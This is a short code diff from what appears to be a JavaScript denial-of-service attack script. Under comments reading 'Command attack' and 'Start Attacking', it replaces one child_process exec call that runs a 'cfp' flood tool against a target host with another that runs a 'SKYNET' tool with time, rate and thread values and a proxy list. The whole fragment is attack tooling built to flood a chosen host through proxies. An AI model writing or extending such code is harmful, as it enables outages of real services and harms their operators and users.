@@ -72,7 +72,7 @@ if(!args[0]) {
 
 // Command attack
 var exec = require('child_process').exec
-exec(`node cfp ${host} 40 100 GET ${time}`, (error, stdout, stderr) => {
+exec(`node SKYNET ${host} ${time} 90 500 proxy.txt`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
